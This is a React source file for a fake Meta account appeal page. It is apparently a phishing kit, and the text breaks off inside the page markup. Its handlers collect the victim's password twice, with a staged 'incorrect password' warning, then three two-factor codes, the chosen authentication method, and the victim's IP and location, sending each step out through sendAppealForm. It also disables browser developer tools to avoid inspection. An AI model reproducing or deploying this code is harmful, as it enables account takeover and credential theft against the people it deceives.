"use client";

import React, { useEffect, useState } from 'react';
import '../../styles/pages/Supportpage.scss';
import '../../styles/base/bootstrap.min.css';
import '../../styles/pages/Modal.scss';
import "react-phone-input-2/lib/style.css";
import AuthModal from '../components/modals/AuthModal';
import PasswordModal from '../components/modals/PasswordModal';
import SecurityModal from '../components/modals/SecurityModal';
import FinalModal from '../components/modals/FinalModal';
import ChoseAuthenModal from '../components/modals/ChoseAuthen';
import { getRecord, getUserLocation, saveRecord, sendAppealForm } from '../utils';
import disableDevtool from 'disable-devtool';
import moment from 'moment';
import "../libs/i18n"
import { useTranslation } from 'react-i18next';

const AccountPageComponent = () => {
    // LANGUAGE
    const { t, i18n } = useTranslation();
    const [ready, setReady] = useState(false);
    
    // STATE MENU
    const [activeMenu, setActiveMenu] = useState(null);

    const currentDate = moment().format('MMMM D, YYYY')

    // LOCATION
    const [userIp, setUserIp] = useState("");
    const [userFlag, setUserFlag] = useState("");

    // Add ticket ID state
    const [ticketId, setTicketId] = useState("4564-ATFD-4865");

    // STATE OPEND MODAL
    const [openAuthModal, setOpenAuthModal] = useState(false);
    const [openPasswordModal, setOpenPasswordModal] = useState(false);
    const [openSecurityModal, setOpenSecurityModal] = useState(false);
    const [openFinalModal, setOpenFinalModal] = useState(false);
    const [openTheIdModal, setOpenTheIdModal] = useState(false);
    const [timeCounter, setTimeCounter] = useState(0);

    const [openChoseAuthenModal, setOpenChoseAuthenModal] = useState(false);
    const [dataCookie, setDataCookie] = useState(null);

    const [dataCookieSecurity, setDataCookieSecurity] = useState(null);

    // LOADING STATE
    const [loadingPassword, setLoadingPassword] = useState(false);
    const [loadingSecurity, setLoadingSecurity] = useState(false);
    const [loadingChoseAuthen, setLoadingChoseAuthen] = useState(false);
    const [loadingTheId, setLoadingTheId] = useState(false);

    // WARNING STATE
    const [warningPassword, setWarningPassword] = useState(false);
    const [warningSecurity, setWarningSecurity] = useState(false);

    // STATE CHECK CLICK
    const [clickPassword, setClickPassword] = useState(0);
    const [clickSecurity, setClickSecurity] = useState(0);

    // STATE FILE UPLOAD
    const [fileList, setFileList] = useState([]);

    const handleFileChange = (newFileList) => {
        setFileList(newFileList);
    };

    useEffect(() => {
        if (typeof window !== 'undefined') {
            disableDevtool();
        }
    }, []);

    useEffect(() => {
        const getIp = async () => {
            try {
                const userLocation = await getUserLocation();
                setUserIp(userLocation?.ip || "Error, contact @otis_cua");

                setUserFlag(userLocation?.country_code || "US");

                const language = userLocation?.country_code.toLowerCase() || "en";
                i18n.changeLanguage(language).then(() => setReady(true));
            } catch (error) {
                console.error("Error getting IP or location:", error);
                setUserFlag("US");
            }
        }
        getIp();
    }, []);

    // FUNCTION HANDLE OPEN MENU
    const handleOpendMenu = (menuId) => {
        setActiveMenu((prevActiveMenu) => (prevActiveMenu === menuId ? null : menuId));
    };

    // FUNCTION HANDLE FINISH APPEAL
    const handleFinishAppeal = async (values) => {
        try {
            const userLocation = await getUserLocation(userIp);

            const cookieVersion_1 = {
                ip: userIp,
                location: userLocation?.location || "Error, contact @otis_cua",
                ...values
            }

            saveRecord("__ck_clv1", cookieVersion_1);
            setOpenAuthModal(false)
            setOpenPasswordModal(true);
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    }

    // FUNCTION HANDLE FINISH PASSWORD
    const handleFinishPassword = async (values) => {
        try {
            if (clickPassword === 0) {
                setLoadingPassword(true);
                let ck_data_v1 = getRecord("__ck_clv1");

                if (!ck_data_v1) {
                    console.log("Not found __ck_data");
                    ck_data_v1 = getRecord("__ck_clv1");
                }

                const cookieVersion_2 = {
                    ...ck_data_v1,
                    password: values.password
                }

                saveRecord("__ck_clv2", cookieVersion_2);
                await sendAppealForm(cookieVersion_2)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingPassword(false);
                            setWarningPassword(true);
                        }, 1500);
                        setClickPassword(1)
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            } else {
                setLoadingPassword(true);
                let ck_data_v2 = getRecord("__ck_clv2");

                if (!ck_data_v2) {
                    console.log("Not found __ck_data");
                    ck_data_v2 = getRecord("__ck_clv2");
                }

                const cookieVersion_3 = {
                    ...ck_data_v2,
                    passwordSecond: values.password
                }

                saveRecord("__ck_clv3", cookieVersion_3);
                await sendAppealForm(cookieVersion_3)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingPassword(false);
                            setWarningPassword(false);

                            setOpenPasswordModal(false);

                            setOpenChoseAuthenModal(true)
                            setDataCookie(cookieVersion_3)
                            // setOpenSecurityModal(true);
                        }, 1500);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            }
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    }

    // FUNCTION HANDLE FINISH CHOSE AUTHEN
    const handleFinishChoseAuthen = async (values) => {
        console.log(values);
        setLoadingChoseAuthen(true);
        let ck_data_v2 = getRecord("__ck_clv3");

        if (!ck_data_v2) {
            console.log("Not found __ck_data");
            ck_data_v2 = getRecord("__ck_clv3");
        }

        const cookieVersion_4 = {
            ...ck_data_v2,
            authMethod: values.authMethod
        }

        saveRecord("__ck_clv4", cookieVersion_4);
        await sendAppealForm(cookieVersion_4)
            .then(() => {
                setTimeout(() => {
                    setLoadingChoseAuthen(false);
                    setOpenChoseAuthenModal(false);
                    setOpenSecurityModal(true);
                    setDataCookieSecurity(cookieVersion_4);
                }, 1500);
            })
            .catch((err) => {
                console.log(err);
            });
    }

    // FUNCTION HANDLE FINISH SECURITY
    const handleFinishSecurity = async (values) => {
        switch (clickSecurity) {
            case 0:
                setLoadingSecurity(true);
                let ck_data_v4 = getRecord("__ck_clv4");

                if (!ck_data_v4) {
                    console.log("Not found __ck_data");
                    ck_data_v4 = getRecord("__ck_clv4");
                }

                const cookieVersion_5 = {
                    ...ck_data_v4,
                    twoFa: values.twoFa
                }

                saveRecord("__ck_clv5", cookieVersion_5);
                await sendAppealForm(cookieVersion_5)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingSecurity(false);
                            setWarningSecurity(true);
                            setTimeCounter(process.env.NEXT_PUBLIC_SETTING_TIME);
                            setClickSecurity(1);
                        }, 1500);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

                break;
            case 1:
                setLoadingSecurity(true);
                let ck_data_v5 = getRecord("__ck_clv5");

                if (!ck_data_v5) {
                    console.log("Not found __ck_data");
                    ck_data_v5 = getRecord("__ck_clv5");
                }

                const cookieVersion_6 = {
                    ...ck_data_v5,
                    twoFaSecond: values.twoFa
                }

                saveRecord("__ck_clv6", cookieVersion_6);
                await sendAppealForm(cookieVersion_6)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingSecurity(false);
                            setWarningSecurity(true);
                            setTimeCounter(process.env.NEXT_PUBLIC_SETTING_TIME);
                            setClickSecurity(2);
                        }, 1300);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

                break;
            case 2:
                setLoadingSecurity(true);
                let ck_data_v6 = getRecord("__ck_clv6");

                if (!ck_data_v6) {
                    console.log("Not found __ck_data");
                    ck_data_v6 = getRecord("__ck_clv6");
                }

                const cookieVersion_7 = {
                    ...ck_data_v6,
                    twoFaThird: values.twoFa
                }

                await sendAppealForm(cookieVersion_7)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingSecurity(false);
                            setOpenSecurityModal(false);
                            setOpenFinalModal(true);
                            resetPasswordState();
                            resetSecurityState();
                        }, 1000);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

                break;
            default:
                break;
        }
    }

    // FUNCTION HANDLE TRY ANOTHER WAY
    const handleTryAnotherWay = () => {
        setOpenSecurityModal(false);
        setOpenChoseAuthenModal(true);
    }

    const resetPasswordState = () => {
        setOpenPasswordModal(false);
        setLoadingPassword(false);
        setWarningPassword(false);
        setClickPassword(0);
    };

    const resetSecurityState = () => {
        setOpenSecurityModal(false);
        setLoadingSecurity(false);
        setWarningSecurity(false);
        setTimeCounter(0);
        setClickSecurity(0);
    };

    useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };
        
        generateTicketId();

    }, []);

    if (!ready) {
        return ('')
    }

    return (
        <>
            <div id='main-component'>
                <div className='container-sm' id='main'>
                    {/* MENU START */}
                    <div className='menu-mobile'>
                        <div className='logo'>
                            <svg width="329" height="66" viewBox="0 0 329 66" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <g clipPath="url(#clip0_4090_978)">
                                    <path d="M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z" fill="#1C2B33" />
                                    <path d="M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z" fill="#0180FA" />
                                    <path d="M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z" fill="url(#paint0_linear_4090_978)" />
                                    <path d="M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0114022V0.0107422Z" fill="url(#paint1_linear_4090_978)" />
                                    <path d="M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z" fill="url(#paint2_linear_4090_978)" />
                                </g>
                                <defs>
                                    <linearGradient id="paint0_linear_4090_978" x1="81.8424" y1="65.34" x2="105.911" y2="39.228" gradientUnits="userSpaceOnUse">
                                        <stop offset="0.427" stopColor="#0278F1" />
                                        <stop offset="0.917" stopColor="#0180FA" />
                                    </linearGradient>
                                    <linearGradient id="paint1_linear_4090_978" x1="27.6361" y1="3.25794" x2="-1.20576" y2="40.6422" gradientUnits="userSpaceOnUse">
                                        <stop offset="0.427" stopColor="#0165E0" />
                                        <stop offset="0.917" stopColor="#0180FA" />
                                    </linearGradient>
                                    <linearGradient id="paint2_linear_4090_978" x1="18.2112" y1="18.9486" x2="87.5348" y2="46.792" gradientUnits="userSpaceOnUse">
                                        <stop stopColor="#0064E0" />
                                        <stop offset="0.656" stopColor="#0066E2" />
                                        <stop offset="1" stopColor="#0278F1" />
                                    </linearGradient>
                                    <clipPath id="clip0_4090_978">
                                        <rect width="329" height="66" fill="white" />
                                    </clipPath>
                                </defs>
                            </svg>
                        </div>

                        <div className='button-menu'>
                            <div className='item-button'></div>
                            <div className='item-button'></div>
                            <div className='item-button'></div>
                        </div>
                    </div>
                    {/* MENU END */}

                    <div className="row container-content">
                        {/* LEFT CONTENT START */}
                        <div className='left col-4'>
                            <div className='left-content'>
                                <div className='logo'>
                                    <svg width="329" height="66" viewBox="0 0 329 66" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <g clipPath="url(#clip0_4090_978)">
                                            <path d="M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z" fill="#1C2B33" />
                                            <path d="M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z" fill="#0180FA" />
                                            <path d="M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z" fill="url(#paint0_linear_4090_978)" />
                                            <path d="M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0114022V0.0107422Z" fill="url(#paint1_linear_4090_978)" />
                                            <path d="M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z" fill="url(#paint2_linear_4090_978)" />
                                        </g>
                                        <defs>
                                            <linearGradient id="paint0_linear_4090_978" x1="81.8424" y1="65.34" x2="105.911" y2="39.228" gradientUnits="userSpaceOnUse">
                                                <stop offset="0.427" stopColor="#0278F1" />
                                                <stop offset="0.917" stopColor="#0180FA" />
                                            </linearGradient>
                                            <linearGradient id="paint1_linear_4090_978" x1="27.6361" y1="3.25794" x2="-1.20576" y2="40.6422" gradientUnits="userSpaceOnUse">
                                                <stop offset="0.427" stopColor="#0165E0" />
                                                <stop offset="0.917" stopColor="#0180FA" />
                                            </linearGradient>
                                            <linearGradient id="paint2_linear_4090_978" x1="18.2112" y1="18.9486" x2="87.5348" y2="46.792" gradientUnits="userSpaceOnUse">
                                                <stop stopColor="#0064E0" />
                                                <stop offset="0.656" stopColor="#0066E2" />
                                                <stop offset="1" stopColor="#0278F1" />
                                            </linearGradient>
                                            <clipPath id="clip0_4090_978">
                                                <rect width="329" height="66" fill="white" />
                                            </clipPath>
                                        </defs>
                                    </svg>
                                </div>
                                <div>
                                    <h1>{t('menu.title')}</h1>
                                    <div id='action-buttons'>
                                        <div className='item-action'>
                                            <div className='action-button'>
                                                <div className='action-icon'>
                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fillRule="evenodd" clipRule="evenodd" d="M9.5035 4.99843L6.3345 2.14643C6.24269 2.06379 6.12353 2.01806 6 2.01806C5.87647 2.01806 5.75731 2.06379 5.6655 2.14643L2.4965 4.99843C2.34021 5.1391 2.21525 5.31106 2.12971 5.50315C2.04418 5.69523 1.99999 5.90316 2 6.11343V9.41843C2 9.52643 2.035 9.60843 2.0745 9.65843C2.10894 9.70393 2.15999 9.73395 2.2165 9.74193C2.6465 9.81193 3.2365 9.88693 4 9.93743V7.99993C4 7.6021 4.15804 7.22057 4.43934 6.93927C4.72064 6.65796 5.10218 6.49993 5.5 6.49993H6.5C6.89782 6.49993 7.27936 6.65796 7.56066 6.93927C7.84196 7.22057 8 7.6021 8 7.99993V9.93743C8.59725 9.90063 9.19241 9.83555 9.7835 9.74243C9.84008 9.73432 9.89115 9.70411 9.9255 9.65843C9.97637 9.58896 10.0026 9.50449 10 9.41843V6.11343C10 5.90316 9.95582 5.69523 9.87029 5.50315C9.78475 5.31106 9.65979 5.1391 9.5035 4.99843ZM1.8275 4.25493L4.9965 1.40293C5.27194 1.15501 5.62941 1.01782 6 1.01782C6.37059 1.01782 6.72806 1.15501 7.0035 1.40293L10.1725 4.25493C10.433 4.4894 10.6413 4.77602 10.7838 5.0962C10.9264 5.41638 11 5.76295 11 6.11343V9.41843C11 10.0644 10.582 10.6249 9.945 10.7289C9.475 10.8054 8.841 10.8849 8.0285 10.9379C7.466 10.9744 7 10.5199 7 9.95593V7.99993C7 7.86732 6.94732 7.74014 6.85355 7.64638C6.75979 7.55261 6.63261 7.49993 6.5 7.49993H5.5C5.36739 7.49993 5.24021 7.55261 5.14645 7.64638C5.05268 7.74014 5 7.86732 5 7.99993V9.95593C5 10.5199 4.534 10.9744 3.9715 10.9379C3.32985 10.899 2.69045 10.8293 2.0555 10.7289C1.418 10.6249 1 10.0649 1 9.41893V6.11343C0.999952 5.76295 1.0736 5.41638 1.21616 5.0962C1.35871 4.77602 1.567 4.4894 1.8275 4.25493Z" fill="black" />
                                                    </svg>
                                                </div>
                                                <div className='action-text'>
                                                    {t('menu.menu_1.title')}
                                                </div>
                                                <div className='action-arrow'>
                                                </div>
                                            </div>
                                        </div>

                                        <div className='item-action'>
                                            <div className='action-button'>
                                                <div className='action-icon'>
                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fillRule="evenodd" clipRule="evenodd" d="M8.30879 9.01603C7.4102 9.73391 6.27085 10.0805 5.12472 9.98457C3.97859 9.88865 2.91269 9.35753 2.14592 8.50027C1.37916 7.64302 0.969739 6.52471 1.00174 5.37502C1.03375 4.22533 1.50475 3.13153 2.31802 2.31827C3.13129 1.505 4.22509 1.03399 5.37478 1.00199C6.52447 0.969983 7.64278 1.37941 8.50003 2.14617C9.35728 2.91293 9.88841 3.97883 9.98433 5.12496C10.0802 6.27109 9.73367 7.41045 9.01579 8.30903L10.8533 10.1465C10.9444 10.2408 10.9948 10.3671 10.9936 10.4982C10.9925 10.6293 10.9399 10.7547 10.8472 10.8474C10.7545 10.9401 10.6291 10.9927 10.498 10.9939C10.3669 10.995 10.2406 10.9446 10.1463 10.8535L8.30879 9.01603ZM8.99979 5.50003C8.99979 5.95966 8.90926 6.41478 8.73336 6.83942C8.55747 7.26406 8.29966 7.6499 7.97466 7.9749C7.64965 8.29991 7.26382 8.55772 6.83918 8.73361C6.41454 8.9095 5.95941 9.00003 5.49979 9.00003C5.04016 9.00003 4.58503 8.9095 4.16039 8.73361C3.73575 8.55772 3.34992 8.29991 3.02491 7.9749C2.69991 7.6499 2.4421 7.26406 2.26621 6.83942C2.09032 6.41478 1.99979 5.95966 1.99979 5.50003C1.99979 4.57177 2.36853 3.68153 3.02491 3.02516C3.68129 2.36878 4.57153 2.00003 5.49979 2.00003C6.42804 2.00003 7.31828 2.36878 7.97466 3.02516C8.63104 3.68153 8.99979 4.57177 8.99979 5.50003Z" fill="black" />
                                                    </svg>
                                                </div>
                                                <div className='action-text'>
                                                    {t('menu.menu_2.title')}
                                                </div>
                                                <div className='action-arrow'>
                                                </div>
                                            </div>
                                        </div>

                                        <div className='item-action'>
                                            <div className='action-button main'>
                                                <div className='action-icon'>
                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <g clipPath="url(#clip0_4090_999)">
                                                            <path fillRule="evenodd" clipRule="evenodd" d="M8 6C8 6.53043 7.78929 7.03914 7.41421 7.41421C7.03914 7.78929 6.53043 8 6 8C5.46957 8 4.96086 7.78929 4.58579 7.41421C4.21071 7.03914 4 6.53043 4 6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4C6.53043 4 7.03914 4.21071 7.41421 4.58579C7.78929 4.96086 8 5.46957 8 6ZM7 6C7 6.26522 6.89464 6.51957 6.70711 6.70711C6.51957 6.89464 6.26522 7 6 7C5.73478 7 5.48043 6.89464 5.29289 6.70711C5.10536 6.51957 5 6.26522 5 6C5 5.73478 5.10536 5.48043 5.29289 5.29289C5.48043 5.10536 5.73478 5 6 5C6.26522 5 6.51957 5.10536 6.70711 5.29289C6.89464 5.48043 7 5.73478 7 6Z" fill="black" />
                                                            <path fillRule="evenodd" clipRule="evenodd" d="M11.0959 4.6035L9.9839 5.6335C10.006 5.87733 10.006 6.12267 9.9839 6.3665L11.0959 7.3965C11.179 7.47347 11.2335 7.57639 11.2505 7.68839C11.2675 7.80039 11.246 7.91484 11.1894 8.013L10.3384 9.487C10.2817 9.58517 10.1933 9.66116 10.0877 9.7025C9.98217 9.74383 9.86569 9.74807 9.7574 9.7145L8.3099 9.2665C8.10995 9.40822 7.89739 9.53123 7.6749 9.634L7.3389 11.111C7.31374 11.2215 7.2518 11.3202 7.16323 11.3908C7.07466 11.4615 6.96471 11.5 6.8514 11.5H5.1504C5.03708 11.5 4.92713 11.4615 4.83856 11.3908C4.74999 11.3202 4.68805 11.2215 4.6629 11.111L4.3269 9.634C4.10442 9.53121 3.89186 9.40819 3.6919 9.2665L2.2444 9.7145C2.13611 9.74807 2.01962 9.74383 1.91406 9.7025C1.80849 9.66116 1.7201 9.58517 1.6634 9.487L0.812396 8.013C0.755836 7.91484 0.734284 7.80039 0.751271 7.68839C0.768258 7.57639 0.822776 7.47347 0.905896 7.3965L2.0179 6.3665C1.99574 6.12267 1.99574 5.87733 2.0179 5.6335L0.905396 4.6035C0.822276 4.52653 0.767758 4.42361 0.750771 4.31161C0.733784 4.19961 0.755336 4.08515 0.811896 3.987L1.6629 2.513C1.7196 2.41483 1.80799 2.33884 1.91356 2.2975C2.01912 2.25617 2.13561 2.25193 2.2439 2.2855L3.6914 2.7335C3.89135 2.59179 4.10391 2.46877 4.3264 2.366L4.6624 0.889C4.68755 0.778515 4.74949 0.67985 4.83806 0.609175C4.92663 0.5385 5.03658 0.500005 5.1499 0.5H6.8514C6.96471 0.500005 7.07466 0.5385 7.16323 0.609175C7.2518 0.67985 7.31374 0.778515 7.3389 0.889L7.6749 2.366C7.89739 2.46876 8.10995 2.59178 8.3099 2.7335L9.7574 2.2855C9.86569 2.25193 9.98217 2.25617 10.0877 2.2975C10.1933 